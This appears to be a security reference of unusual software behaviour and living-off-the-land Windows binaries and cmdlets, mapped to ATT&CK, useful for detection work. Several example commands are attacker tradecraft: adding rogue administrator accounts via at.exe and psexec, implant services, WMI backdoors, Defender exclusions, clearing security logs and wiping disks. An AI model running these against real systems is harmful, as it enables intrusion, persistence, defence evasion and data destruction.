# Cross-Platform & Unusual Binaries
> Source: WTFBins, LOFL | Entries: 437 | Platform: cross_platform, windows


## Index

- [adobe](#adobe)
- [android](#android)
- [arcgis](#arcgis)
- [avast](#avast)
- [azure](#azure)
- [Binary](#binary)
- [Builtin](#builtin)
- [chrome](#chrome)
- [CIMSession](#cimsession)
- [Cmdlet](#cmdlet)
- [Data](#data)
- [Domain](#domain)
- [easeus](#easeus)
- [eset](#eset)
- [Extra](#extra)
- [GUI](#gui)
- [imanage](#imanage)
- [logmein](#logmein)
- [mcafee](#mcafee)
- [microsoft](#microsoft)
- [network](#network)
- [nim](#nim)
- [paloalto](#paloalto)
- [ringcentral](#ringcentral)
- [sentinelone](#sentinelone)
- [sophos](#sophos)
- [trendmicro](#trendmicro)
- [Uncategorized](#uncategorized)
- [windows](#windows)


### adobe

#### Adobe CC Setup
Adobe performs...process injection??



Adobe Creative Cloud setup spawns and injects code to explorer.exe for deleti...
**Categories:** adobe, windows, process injection

#### Adobe Reader (reader_sl.exe)
Adobe Reader for no reason starts a subprocess using the command line "I run".
**Categories:** adobe, windows, commandline

### android

#### Samsung MobileWips
Bizarre DNS requests on Samsung phones.


   
Samsung MobileWips (presumably a Wireless Intrusion Prevention System)...
**Categories:** android, tor

### arcgis

#### ArcGISPortal.exe
Not just bad guys run `whoami`.


   
`ArcGISPortal.exe` runs `whoami.exe`.
I know other Defenders have been [caught...
**Categories:** arcgis, windows, whoami

### avast

#### AvastSvc.exe
Avast scans your network on the sly.


   
During scans, `AvastSvc.exe` will attempt to connect to neighboring IP add...
**Categories:** avast, windows, ssh

### azure

#### gc_worker.exe
Base64-encoded PowerShell from Azure's own agent!


   
The Azure Connected Machine Agent spawns a process that runs...
**Categories:** azure, windows, powershell

### Binary

#### AccessEnum.exe
Displays who has access to items within a directory or registry key; Type: Binary; MITRE ATT&CK: T1083; Toolsets: GUI...
**Categories:** Binary, Data, GUI, Sysinternals, T1083
```
AccessEnum.exe
```

#### adexplorer.exe
Advanced Active Directory (AD) viewer and editor; Type: Binary; Toolsets: GUI, Sysinternals
**Categories:** Binary, Domain, GUI, Sysinternals
```
adexplorer.exe
```

#### adrestore.exe
Enumerates deleted (tombstoned) objects in a domain and gives you the option of restoring each one; Type: Binary; Too...
**Categories:** Binary, Domain, Sysinternals, TODO
```
adrestore.exe
```

#### at.exe
Schedules commands and programs to run on a computer at a specified time and date; Type: Binary; MITRE ATT&CK: T1053....
**Categories:** Binary, Builtin, Execute, Recon, T1053.002
```
at.exe \\W10.ad.bitsadmin.com 06:00 cmd /c "net user Hacker H4ck#rt /add & net localgroup Administrators Hacker /add"
```

#### csvde.exe
Imports and exports data from Active Directory Domain Services (AD DS) using files that store data in the comma-separ...
**Categories:** Binary, Builtin, Domain, TODO
```
csvde.exe -m -f users.csv -s DC1.ad.bitsadmin.com -d "cn=users,DC=ad,DC=bitsadmin,DC=com" -r "(objectClass=user)"
```

#### cusrmgr.exe
Manage local user accounts; Type: Binary; Toolsets: Extra
**Categories:** Binary, Extra, Manage
```
cusrmgr.exe -u TargetUser -P Password1! -m \\W10.ad.bitsadmin.com
```

#### dcdiag.exe
Directory Server Diagnosis; Type: Binary; Toolsets: RSAT, TODO
**Categories:** Binary, Domain, RSAT, TODO
```
dcdiag.exe
```

#### devcon.exe
Displays detailed information about devices; Type: Binary; MITRE ATT&CK: TA0043; Toolsets: Extra
**Categories:** Binary, Extra, Recon, TA0043
```
devcon.exe -m:\\W10.ad.bitsadmin.com find *
```

#### dfscmd.exe
Configures DFS folders and folder targets in a DFS namespace; Type: Binary; Toolsets: RSAT, TODO
**Categories:** Binary, Manage, RSAT, TODO
```
dfscmd.exe
```

#### dfsdiag.exe
Provides diagnostic information for DFS Namespaces; Type: Binary; Toolsets: RSAT, TODO
**Categories:** Binary, Manage, RSAT, TODO
```
dfsdiag.exe
```

#### dfsrdiag.exe
DFS Replication operational and diagnostics command line utility; Type: Binary; Toolsets: RSAT, TODO
**Categories:** Binary, Manage, RSAT, TODO
```
dfsrdiag.exe
```

#### dfsutil.exe
Manage DFS Namespaces, servers, and clients; Type: Binary; Toolsets: RSAT
**Categories:** Binary, Data, RSAT
```
dfsutil.exe root \\ad.bitsadmin.com\Users
```

#### djoin.exe
Provision a computer account in the domain; Type: Binary; Toolsets: RSAT, TODO
**Categories:** Binary, Domain, RSAT, TODO
```
djoin.exe /PROVISION /DOMAIN ad.bitsadmin.com /MACHINE hacker /SAVEFILE hacker.txt /DEFPWD /PRINTBLOB /NETBIOS hacker
```

#### dnscmd.exe
Command-line interface for managing DNS servers; Type: Binary; Toolsets: RSAT, TODO
**Categories:** Binary, Manage, RSAT, TODO
```
dnscmd.exe
```

#### driverquery.exe
Display a list of installed device drivers; Type: Binary; MITRE ATT&CK: TA0043; Toolsets: Builtin
**Categories:** Binary, Builtin, Recon, TA0043
```
driverquery.exe /s W10.ad.bitsadmin.com
```

#### dsac.exe
Active Directory Administrative Center; Type: Binary; Toolsets: GUI, RSAT
**Categories:** Binary, Domain, GUI, RSAT
```
dsac.exe
```

#### dsacls.exe
Displays or modifies permissions (ACLS) of an Active Directory Domain Services (AD DS) Object; Type: Binary; Toolsets...
**Categories:** Binary, Domain, RSAT, TODO
```
dsacls.exe
```

#### dsadd.exe
Add specific types of objects to the directory; Type: Binary; Toolsets: RSAT, TODO
**Categories:** Binary, Domain, RSAT, TODO
```
dsadd.exe
```

#### dsget.exe
Display the selected properties of a specific object in the directory; Type: Binary; Toolsets: RSAT, TODO
**Categories:** Binary, Domain, RSAT, TODO
```
dsget.exe
```

#### dsmgmt.exe
Facilitates managing AD DS/LDS application partitions, management and control of the Flexible Single Master Operation...
**Categories:** Binary, Domain, RSAT, TODO
```
dsmgmt.exe
```

#### dsmod.exe
Modifies existing objects in the directory; Type: Binary; Toolsets: RSAT, TODO
**Categories:** Binary, Domain, RSAT, TODO
```
dsmod.exe
```

#### dsmove.exe
Moves or renames an object within the directory; Type: Binary; Toolsets: RSAT, TODO
**Categories:** Binary, Domain, RSAT, TODO
```
dsmove.exe
```

#### dsquery.exe
This tool's commands suite allow you to query the directory according to specified criteria. Each of the following ds...
**Categories:** Binary, Domain, RSAT, TODO
```
dsquery.exe
```

#### dsrm.exe
Deletes objects from the directory; Type: Binary; Toolsets: RSAT, TODO
**Categories:** Binary, Domain, RSAT, TODO
```
dsrm.exe
```

#### eventcreate.exe
Create a custom event in a specified event log; Type: Binary; Toolsets: Builtin
**Categories:** Binary, Builtin, Logs
```
eventcreate.exe /S W10.ad.bitsadmin.com /T Error /ID 100 /L Application /D "Some description"
```

#### finger.exe
Displays information about a user on a specified system running the Finger service; Type: Binary; Toolsets: Builtin,...
**Categories:** Binary, Builtin, Network, TODO
```
finger.exe
```

#### getmac.exe
Returns the media access control (MAC) address and list of network protocols associated with each address for all net...
**Categories:** Binary, Builtin, Network
```
getmac.exe /V /S W10.ad.bitsadmin.com
```

#### gpfixup.exe
Group Policy fix up utility; Type: Binary; Toolsets: RSAT, TODO
**Categories:** Binary, Domain, RSAT, TODO
```
gpfixup.exe
```

#### gpresult.exe
Displays the Resultant Set of Policy (RSoP) information for a remote user and computer; Type: Binary; MITRE ATT&CK: T...
**Categories:** Binary, Builtin, Recon, TA0043
```
gpresult.exe /S W10.ad.bitsadmin.com /SCOPE COMPUTER /X W10.xml
```

#### ldifde.exe
LDIF Directory Exchange; Type: Binary; Toolsets: RSAT, TODO
**Categories:** Binary, Domain, RSAT, TODO
```
ldifde.exe
```

#### local.exe
Displays members of local groups on remote servers or domains; Type: Binary; Toolsets: Extra
**Categories:** Binary, Extra, Manage
```
local.exe Administrators \\W10.ad.bitsadmin.com
```

#### logman.exe
Creates and manages Event Trace Session and Performance logs and supports many functions of Performance Monitor from...
**Categories:** Binary, Builtin, Logs
```
logman.exe query providers -s W10.ad.bitsadmin.com
```

#### logoff.exe
Terminates a session; Type: Binary; Toolsets: Builtin
**Categories:** Binary, Builtin, Sessions
```
logoff.exe rdp-tcp#0 /SERVER:W10.ad.bitsadmin.com
```

#### manage-bde.exe
BitLocker Drive Encryption Configuration Tool; Type: Binary; MITRE ATT&CK: T1486; Toolsets: Builtin, TODO
**Categories:** Binary, Builtin, Data, T1486, TODO
```
manage-bde.exe -ComputerName W10.ad.bitsadmin.com
```

#### Microsoft.ConfigurationManagement.exe
Microsoft Configuration Manager (MCM); Type: Binary; Toolsets: Extra, GUI
**Categories:** Binary, Extra, GUI, Manage
```
"C:\Program Files (x86)\Microsoft Endpoint Manager\AdminConsole\bin\Microsoft.ConfigurationManagement.exe"
```

#### mofcomp.exe
Parses a file containing MOF statements and adds the classes and class instances defined in the file to the WMI repos...
**Categories:** Binary, Builtin, Execute, T1047, TODO
```
mofcomp.exe -N:\\W10.ad.bitsadmin.com\root\subscription .\backdoor.mof
```

#### msg.exe
Send a message to a user; Type: Binary; Toolsets: Builtin, TODO
**Categories:** Binary, Builtin, Sessions, TODO
```
msg.exe
```

#### msinfo32.exe
Show system information; Type: Binary; MITRE ATT&CK: T1082; Toolsets: Builtin, GUI
**Categories:** Binary, Builtin, GUI, Recon, T1082
```
msinfo32.exe
```

#### msra.exe
Windows Remote Assistance; Type: Binary; Toolsets: Builtin, TODO
**Categories:** Binary, Builtin, Sessions, TODO
```
msra.exe
```

#### mstsc.exe
Connect to the desktop of remote computers; Type: Binary; MITRE ATT&CK: T1021.001; Toolsets: Builtin, GUI
**Categories:** Binary, Builtin, GUI, Sessions, T1021.001
```
mstsc.exe /v:SP2019.ad.bitsadmin.com /shadow:1 /noConsentPrompt /control
```

#### ndkping.exe
RDMA Ping Cmd; Type: Binary; Toolsets: Builtin, TODO
**Categories:** Binary, Builtin, Network, TODO
```
ndkping.exe
```

#### net.exe
Functionalities related to querying and modifying the domain, services, shares and users; Type: Binary; MITRE ATT&CK:...
**Categories:** Binary, Builtin, Data, Domain, Recon, T1078.002, T1124, T1135, T1136.002
```
net.exe view \\W10.ad.bitsadmin.com /all
```

#### netdom.exe
Manage Active Directory domains and trust relationships from the command prompt; Type: Binary; MITRE ATT&CK: T1484.00...
**Categories:** Binary, Domain, RSAT, Server, T1484.002
```
netdom.exe join %computername% /domain:ad.bitsadmin.com
```

#### netsh.exe
Display or modify the network configuration; Type: Binary; MITRE ATT&CK: T1562.004; Toolsets: Builtin
**Categories:** Binary, Builtin, Network, T1562.004
```
netsh.exe -r W10.ad.bitsadmin.com advfirewall firewall show rule name="Remote Desktop - Shadow (TCP-In)"
```

#### nlb.exe
Manage Network Load Balancing (NLB); Type: Binary; Toolsets: Server, TODO
**Categories:** Binary, Network, Server, TODO
```
nlb.exe
```

#### nltest.exe
Perform network administrative tasks; Type: Binary; MITRE ATT&CK: T1529; Toolsets: RSAT
**Categories:** Binary, Domain, RSAT, Sessions, T1529
```
nltest.exe /domain_trusts /all_trusts /v /server:DC1.ad.bitsadmin.com
```

#### nslookup.exe
Displays information that you can use to diagnose Domain Name System (DNS) infrastructure; Type: Binary; MITRE ATT&CK...
**Categories:** Binary, Builtin, Network, T1590.002
```
nslookup.exe -q=srv _ldap._tcp.ad.bitsadmin.com
```

#### portqry.exe
Displays the state of TCP and UDP ports; Type: Binary; MITRE ATT&CK: T1007, T1046; Toolsets: Extra
**Categories:** Binary, Extra, Network, T1007, T1046
```
portqry.exe -n DC1.ad.bitsadmin.com -e 135
```

#### printui.exe
Automates many printer configuration tasks; Type: Binary; Toolsets: Builtin, GUI
**Categories:** Binary, Builtin, GUI, Misc
```
rundll32.exe printui.dll,PrintUIEntry /im /c\\W10.ad.bitsadmin.com
```

#### psexec.exe
Executes a program on a remote system, where remotely executed console applications execute interactively; Type: Bina...
**Categories:** Binary, Execute, Sysinternals, T1569.002
```
psexec.exe \\W10.ad.bitsadmin.com -s cmd.exe /c net user hacker hacker /add ^&^& net localgroup Administrators hacker /add
```

#### psfile.exe
Lists or closes files opened remotely; Type: Binary; Toolsets: Sysinternals, TODO
**Categories:** Binary, Data, Sysinternals, TODO
```
psfile.exe -nobanner \\W10.ad.bitsadmin.com
```

#### psgetsid.exe
Translates SIDs to names and vice versa; Type: Binary; MITRE ATT&CK: TA0043; Toolsets: Sysinternals
**Categories:** Binary, Recon, Sysinternals, TA0043
```
psgetsid.exe \\W10.ad.bitsadmin.com
```

#### psinfo.exe
Local and remote system information viewer; Type: Binary; MITRE ATT&CK: T1082; Toolsets: Sysinternals
**Categories:** Binary, Recon, Sysinternals, T1082
```
psinfo.exe \\W10.ad.bitsadmin.com
```

#### pskill.exe
Terminates processes on local or remote systems; Type: Binary; MITRE ATT&CK: T1562.001; Toolsets: Sysinternals, TODO
**Categories:** Binary, Processes, Sysinternals, T1562.001, TODO
```
pskill.exe
```

#### pslist.exe
Process information lister; Type: Binary; MITRE ATT&CK: T1057; Toolsets: Sysinternals, TODO
**Categories:** Binary, Processes, Sysinternals, T1057, TODO
```
pslist.exe -nobanner \\W10.ad.bitsadmin.com
```

#### psloggedon.exe
See who's logged on; Type: Binary; Toolsets: Sysinternals
**Categories:** Binary, Sessions, Sysinternals
```
psloggedon.exe -nobanner \\W10.ad.bitsadmin.com
```

#### psloglist.exe
Dumps event logs on a local or remote system; Type: Binary; MITRE ATT&CK: T1070.001; Toolsets: Sysinternals
**Categories:** Binary, Logs, Sysinternals, T1070.001
```
psloglist.exe -nobanner -i 99999 -c \\W10.ad.bitsadmin.com Security
```

#### pspasswd.exe
Changes passwords on a local or remote system; Type: Binary; MITRE ATT&CK: T1531; Toolsets: Sysinternals
**Categories:** Binary, Sessions, Sysinternals, T1531
```
pspasswd.exe \\W10.ad.bitsadmin.com MyUser MyNewPassword
```

#### psping.exe
Implements Ping functionality, TCP ping, UDP/TCP latency, and UDP / TCP bandwidth measurement; Type: Binary; Toolsets...
**Categories:** Binary, Network, Sysinternals, TODO
```
psping.exe
```

#### psservice.exe
Lists or controls services on a local or remote system; Type: Binary; MITRE ATT&CK: T1569.002; Toolsets: Sysinternals
**Categories:** Binary, Processes, Sysinternals, T1569.002
```
psservice.exe \\W10.ad.bitsadmin.com config
```

#### psshutdown.exe
Shutdown, logoff and power manage local and remote systems; Type: Binary; MITRE ATT&CK: T1529; Toolsets: Sysinternals
**Categories:** Binary, Sessions, Sysinternals, T1529
```
psshutdown.exe -f -k \\W10.ad.bitsadmin.com
```

#### pssuspend.exe
Suspends or resumes processes on a local or remote system; Type: Binary; Toolsets: Sysinternals
**Categories:** Binary, Processes, Sysinternals
```
pssuspend.exe -r \\W10.ad.bitsadmin.com procexp.exe
```

#### qappsrv.exe
Displays the available Remote Desktop Session Host servers on the network; Type: Binary; Toolsets: Builtin
**Categories:** Binary, Builtin, Manage
```
qappsrv dc1.ad.bitsadmin.com
```

#### qprocess.exe
Displays information about processes that are running on a Remote Desktop Session Host server; Type: Binary; MITRE AT...
**Categories:** Binary, Builtin, Processes, T1057
```
qprocess.exe /server:W10.ad.bitsadmin.com DomainUser2
```

#### query.exe
Displays information about processes, sessions, and Remote Desktop Session Host servers; Type: Binary; MITRE ATT&CK:...
**Categories:** Binary, Builtin, Processes, Sessions, T1057
```
query.exe session /server:W10.ad.bitsadmin.com
```

#### quser.exe
Displays information about user sessions on a Remote Desktop Session Host server; Type: Binary; Toolsets: Builtin
**Categories:** Binary, Builtin, Sessions
```
quser.exe /server:W10.ad.bitsadmin.com
```

#### qwinsta.exe
Display information about Remote Desktop Services sessions; Type: Binary; Toolsets: Builtin
**Categories:** Binary, Builtin, Sessions
```
qwinsta.exe /server:W10.ad.bitsadmin.com
```

#### RDCMan.exe
Remote Desktop Connection Manager; Type: Binary; MITRE ATT&CK: T1021.001; Toolsets: GUI, Sysinternals
**Categories:** Binary, GUI, Sessions, Sysinternals, T1021.001
```
RDCMan.exe
```

#### reg.exe
Query and edit the registry; Type: Binary; MITRE ATT&CK: T1012, T1112, T1547.001; Toolsets: Builtin
**Categories:** Binary, Builtin, Registry, T1012, T1112, T1547.001
```
reg.exe query "\\W10.ad.bitsadmin.com\HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
```

#### regedit.exe
Registry Editor; Type: Binary; MITRE ATT&CK: T1012, T1112; Toolsets: Builtin, GUI
**Categories:** Binary, Builtin, GUI, Registry, T1012, T1112
```
regedit.exe
```

#### regini.exe
Modifies the registry from the command line or a script; Type: Binary; MITRE ATT&CK: T1112; Toolsets: Builtin, TODO
**Categories:** Binary, Builtin, Registry, T1112, TODO
```
regini.exe -m \\W10.ad.bitsadmin.com mybackdoor.ini
```

#### rendom.exe
Performs various actions necessary for a domain rename operation; Type: Binary; Toolsets: Builtin, TODO
**Categories:** Binary, Builtin, Domain, TODO
```
rendom.exe
```

#### repadmin.exe
Diagnose Active Directory replication problems between domain controllers; Type: Binary; Toolsets: Builtin
**Categories:** Binary, Builtin, Data
```
repadmin.exe /replsummary /homeserver:DC1.ad.bitsadmin.com
```

#### reset.exe
Reset the session subsytem hardware and software to known initial values; Type: Binary; Toolsets: Builtin
**Categories:** Binary, Builtin, Sessions
```
reset.exe session 1 /SERVER:W10.ad.bitsadmin.com /V
```

#### rpcdump.exe
RPC endpoint diagnostic utility; Type: Binary; MITRE ATT&CK: TA0043; Toolsets: Extra
**Categories:** Binary, Extra, Recon, TA0043
```
rpcdump.exe /S W10.ad.bitsadmin.com /V /I > W10.txt
```

#### rwinsta.exe
Reset the session subsytem hardware and software to known initial values; Type: Binary; Toolsets: Builtin
**Categories:** Binary, Builtin, Sessions
```
rwinsta.exe 1 /SERVER:W10.ad.bitsadmin.com /V
```

#### sc.exe
Interact with the Service Control Manager database; Type: Binary; MITRE ATT&CK: T1489, T1543.003, T1569.002, TA0043;...
**Categories:** Binary, Builtin, Execute, Recon, T1489, T1543.003, T1569.002, TA0043
```
sc.exe \\W10.ad.bitsadmin.com create MyService binpath= C:\Windows\implant.exe
```

#### schtasks.exe
Create, delete, query, change, run and end scheduled tasks; Type: Binary; MITRE ATT&CK: T1053.005; Toolsets: Builtin
**Categories:** Binary, Builtin, Execute, Recon, T1053.005
```
schtasks.exe /S W10.ad.bitsadmin.com /Create /RU SYSTEM /SC HOURLY /TN "Microsoft\Windows\Printing\Print Spooler (x64)" /TR "C:\Windows\System32\spoolsv64.exe"
```

#### scp.exe
Secure Copy; Type: Binary; MITRE ATT&CK: T1105; Toolsets: Builtin
**Categories:** Binary, Builtin, Data, T1105
```
scp.exe -o GSSAPIAuthentication=yes -o GSSAPIDelegateCredentials=yes myuser@linux.ad.bitsadmin.com:/tmp/file.tgz file.tgz
```

#### sdelete.exe
Secure file delete; Type: Binary; MITRE ATT&CK: T1070.004; Toolsets: Sysinternals
**Categories:** Binary, Data, Sysinternals, T1070.004
```
sdelete \\W10.ad.bitsadmin.com\C$\backdoor.exe
```

#### ServerManager.exe
Manage roles and features on servers in the domain; Type: Binary; Toolsets: GUI, RSAT
**Categories:** Binary, GUI, Manage, RSAT
```
ServerManager.exe
```

#### setspn.exe
Reads, modifies, and deletes the Service Principal Names (SPN) directory property for an Active Directory service acc...
**Categories:** Binary, Builtin, Domain
```
setspn.exe -L ad.bitsadmin.com\SP2019
```

#### setx.exe
Modifies the value of a service's entries in the registry and in the Service Control Manager database; Type: Binary;...
**Categories:** Binary, Builtin, Registry, T1112
```
setx.exe /S W10.ad.bitsadmin.com /M MYVAR "Hello there!"
```

#### shadow.exe
Remotely control an active session of another user on a Remote Desktop Session Host server; Type: Binary; MITRE ATT&C...
**Categories:** Binary, Builtin, Sessions, T1563.002
```
shadow.exe 3 /SERVER:W10.ad.bitsadmin.com
```

#### shrpubw.exe
Create a Shared Folder Wizard; Type: Binary; MITRE ATT&CK: T1021.002, T1135; Toolsets: Builtin, GUI
**Categories:** Binary, Builtin, GUI, Manage, T1021.002, T1135
```
shrpubw /s W10.ad.bitsadmin.com
```

#### shutdown.exe
Shut down or restart local or remote computers, one at a time; Type: Binary; MITRE ATT&CK: T1529; Toolsets: Builtin
**Categories:** Binary, Builtin, Sessions, T1529
```
shutdown.exe /r /f /t 0 /m \\W10.ad.bitsadmin.com
```

#### SmeDesktop.exe
Windows Admin Center; Type: Binary; Toolsets: Extra, GUI
**Categories:** Binary, Extra, GUI, Manage
```
"C:\Program Files\Windows Admin Center\SmeDesktop.exe"
```

#### sqlcmd.exe
Integrated environment for managing any SQL infrastructure, from SQL Server to Azure SQL Database; Type: Binary; Tool...
**Categories:** Binary, Extra, Manage
```
sqlcmd.exe -S SQL1.ad.bitsadmin.com\SQLEXPRESS
```

#### srvcheck.exe
Server share check; Type: Binary; MITRE ATT&CK: T1135; Toolsets: Extra
**Categories:** Binary, Data, Extra, T1135
```
srvcheck.exe \\DC1.ad.bitsadmin.com
```

#### srvinfo.exe
Gather information about a target server; Type: Binary; MITRE ATT&CK: T1082; Toolsets: Extra
**Categories:** Binary, Extra, Recon, T1082
```
srvinfo.exe \\DC1.ad.bitsadmin.com
```

#### ssh.exe
Secure Shell client; Type: Binary; Toolsets: Builtin
**Categories:** Binary, Builtin, Sessions
```
ssh.exe -Kv myuser@linux.ad.bitsadmin.com
```

#### Ssms.exe
SQL Server Management Studio (SSMS); Type: Binary; Toolsets: Extra, GUI
**Categories:** Binary, Extra, GUI, Manage
```
"C:\Program Files (x86)\Microsoft SQL Server Management Studio 19\Common7\IDE\Ssms.exe"
```

#### systeminfo.exe
Displays detailed configuration information about a computer and its operating system, including operating system con...
**Categories:** Binary, Builtin, Recon, T1082
```
systeminfo.exe /S W10.ad.bitsadmin.com
```

#### takeown.exe
Allows an administrator to recover access to a file that was denied by re-assigning file ownership; Type: Binary; Too...
**Categories:** Binary, Builtin, Data, TODO
```
takeown.exe /S system /F MyShare\Acme*.doc
```

#### taskkill.exe
Terminate tasks by process id (PID) or image name; Type: Binary; MITRE ATT&CK: T1562.001; Toolsets: Builtin
**Categories:** Binary, Builtin, Processes, T1562.001
```
taskkill.exe /S W10.ad.bitsadmin.com /F /IM cmd.exe
```

#### tasklist.exe
Displays a list of currently running processes; Type: Binary; MITRE ATT&CK: T1057; Toolsets: Builtin
**Categories:** Binary, Builtin, Processes, T1057
```
tasklist.exe /S W10.ad.bitsadmin.com /FO CSV > W10_tasklist.csv
```

#### TpmVscMgr.exe
Create and delete TPM virtual smart cards; Type: Binary; Toolsets: Builtin, TODO
**Categories:** Binary, Builtin, Misc, TODO
```
TpmVscMgr.exe create /machine W11.ad.bitsadmin.com /name MyVSC /pin default /adminkey random /generate
```

#### tsdiscon.exe
Disconnects a session from a Remote Desktop Session Host (RD Session Host) server; Type: Binary; MITRE ATT&CK: T1531;...
**Categories:** Binary, Builtin, Sessions, T1531
```
tsdiscon.exe rdp-tcp#1 /server:W10.ad.bitsadmin.com
```

#### tskill.exe
Ends a process; Type: Binary; MITRE ATT&CK: T1562.001; Toolsets: Builtin
**Categories:** Binary, Builtin, Processes, T1562.001
```
tskill.exe cmd /Server:W10.ad.bitsadmin.com /A /V
```

#### typeperf.exe
Writes performance data to the command window or to a log file; Type: Binary; Toolsets: Builtin, TODO
**Categories:** Binary, Builtin, Logs, TODO
```
typeperf.exe "\\W10.ad.bitsadmin.com\Processor(0)\% User Time"
```

#### uptime.exe
Display uptime of a system; Type: Binary; MITRE ATT&CK: T1082; Toolsets: Extra
**Categories:** Binary, Extra, Recon, T1082
```
uptime.exe W10.ad.bitsadmin.com
```

#### volrest.exe
Previous Version command-line tool; Type: Binary; MITRE ATT&CK: T1003.002, T1083; Toolsets: Extra
**Categories:** Binary, Data, Extra, T1003.002, T1083
```
volrest.exe \\W10.ad.bitsadmin.com\C$\Windows\System32\Config
```

#### w32tm.exe
Synchronize the date and time; Type: Binary; MITRE ATT&CK: T1124; Toolsets: Builtin
**Categories:** Binary, Builtin, Recon, T1124
```
w32tm.exe /query /computer:W10.ad.bitsadmin.com /status /verbose
```

#### waitfor.exe
Sends or waits for a signal on a system; Type: Binary; Toolsets: Builtin, TODO
**Categories:** Binary, Builtin, Misc, TODO
```
waitfor.exe
```

#### wevtutil.exe
Windows Events Command Line Utility; Type: Binary; MITRE ATT&CK: T1070.001; Toolsets: Builtin
**Categories:** Binary, Builtin, Recon, T1070.001
```
wevtutil /remote:CAROOT1.ad.bitsadmin.com cl Security
```

#### WinAppDeployCmd.exe
Deploy a Universal Windows Platform (UWP) app to any Windows 10 device; Type: Binary; Toolsets: Extra
**Categories:** Binary, Extra, Manage
```
WinAppDeployCmd.exe list -ip 10.0.10.51
```

#### winrs.exe
Manage and execute programs remotely; Type: Binary; MITRE ATT&CK: T1021.006, T1059.001; Toolsets: Builtin
**Categories:** Binary, Builtin, Execute, T1021.006, T1059.001
```
winrs.exe -r:W10.ad.bitsadmin.com ipconfig /all
```

#### wmic.exe
Command-line interface for Windows Management Instrumentation (WMI); Type: Binary; MITRE ATT&CK: T1047, T1057; Toolse...
**Categories:** Binary, Builtin, Execute, Processes, T1047, T1057
```
wmic.exe /node:W10.ad.bitsadmin.com process call create "beacon.exe"
```

### Builtin

#### Add-EtwTraceProvider
Adds an ETW trace provider to an ETW Autologger configuration or ETW session; Type: Cmdlet; MITRE ATT&CK: T1047; Tool...
**Categories:** Builtin, CIMSession, Cmdlet, Misc, T1047, TODO
```
Add-EtwTraceProvider -CimSession $s
```

#### Add-MpPreference
Modifies settings for Windows Defender; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession
**Categories:** Builtin, CIMSession, Cmdlet, Manage, T1047
```
Add-MpPreference -ExclusionPath 'C:\EvilTools' -CimSession $s
```

#### Add-NetEventPacketCaptureProvider
Adds a Remote Packet Capture provider; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047
```
Add-NetEventPacketCaptureProvider -SessionName sess -CimSession $s -Level 4 -CaptureType Physical -TruncationLength ([UInt16]::MaxValue)
```

#### Add-NetNatExternalAddress
Adds an external address to a NAT instance; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession, TODO
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047, TODO
```
Add-NetNatExternalAddress -CimSession $s
```

#### Add-NetNatStaticMapping
Adds a static mapping to a NAT instance; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession, TODO
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047, TODO
```
Add-NetNatStaticMapping -CimSession $s
```

#### certlm.msc
Certificates - Local Computer; Type: MMC Snap-in; MITRE ATT&CK: T1553.004; Toolsets: Builtin, GUI
**Categories:** Builtin, GUI, MMC Snap-in, Manage, T1553.004
```
certlm.msc
```

#### certmgr.msc
Certificates - Current User; Type: MMC Snap-in; Toolsets: Builtin, GUI
**Categories:** Builtin, GUI, MMC Snap-in, Manage
```
certmgr.msc
```

#### CIM_DataFile
Type of logical file that is a named collection of data or executable code; Type: WMI Class; Toolsets: Builtin, CIMSe...
**Categories:** Builtin, CIMSession, Data, WMI Class
```
Get-CimInstance -Query "Select * from CIM_DataFile Where ((Drive = 'C:') AND (FileName = 'ntuser') AND (Extension = 'dat'))" -CimSession $s
```

#### CIM_Directory
Type of file that logically groups data files 'contained' in it, and provides path information for the grouped files;...
**Categories:** Builtin, CIMSession, Data, TODO, WMI Class

#### CIM_LogicalFile
Represents a named collection of data located in a file system on a storage extent; Type: WMI Class; Toolsets: Builti...
**Categories:** Builtin, CIMSession, Data, TODO, WMI Class

#### Clear-Disk
Cleans a disk by removing all partition information and un-initializing it, erasing all data on the disk; Type: Cmdle...
**Categories:** Builtin, CIMSession, Cmdlet, Data, T1047, T1561
```
Clear-Disk -CimSession $s -Number 3
```

#### Clear-DnsClientCache
Clears the contents of the DNS client cache; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession
**Categories:** Builtin, CIMSession, Cmdlet, Network, T1047
```
Clear-DnsClientCache -CimSession $s
```

#### Clear-Eventlog
Clears all entries from specified event logs on the local or remote computers.; Type: Cmdlet; MITRE ATT&CK: T1070.001...
**Categories:** Builtin, Cmdlet, Logs, T1070.001
```
Clear-EventLog -LogName Application,Security,System -ComputerName W10.ad.bitsadmin.com,W11.ad.bitsadmin.com
```

#### Close-SmbOpenFile
Closes a file that is open by one of the clients of the SMB server; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Buil...
**Categories:** Builtin, CIMSession, Cmdlet, Data, T1047, TODO
```
Close-SmbOpenFile -CimSession $s
```

#### Close-SmbSession
Ends forcibly the SMB session; Type: Cmdlet; MITRE ATT&CK: T1047; Toolsets: Builtin, CIMSession, TODO
**Categories:** Builtin, CIMSession, Cmdlet, Data, T1047, TODO
```
Close-SmbSession -CimSession $s
```

#### comexp.msc
Component Services; Type: MMC Snap-in; Toolsets: Builtin, GUI
**Categories:** Builtin, GUI, MMC Snap-in, Manage
```
comexp.msc
```

#### compmgmt.msc
Computer Management; Type: MMC Snap-in; Toolsets: Builtin, GUI
**Categories:** Builtin, GUI, MMC Snap-in, Manage
```
compmgmt.msc /computer:DC1.ad.bitsadmin.com
```

#### Connect-WSMan
Connects to the WinRM service on a remote computer; Type: Cmdlet; Toolsets: Builtin, TODO
**Categories:** Builtin, Cmdlet, Manage, TODO
```
Connect-WSMan
```

#### Copy-Item
Copies an item from one location to another; Type: Cmdlet; MITRE ATT&CK: T1021.002, T1021.006, T1570; Toolsets: Built...
**Categories:** Builtin, Cmdlet, Data, PSSession, T1021.002, T1021.006, T1570
```
Copy-Item -Path C:\boot.ini -Destination . -FromSession $ps
```

#### Copy-VMFile
Copies a file to a virtual machine; Type: Cmdlet; Toolsets: Builtin, CIMSession
**Categories:** Builtin, CIMSession, Cmdlet, Data
```
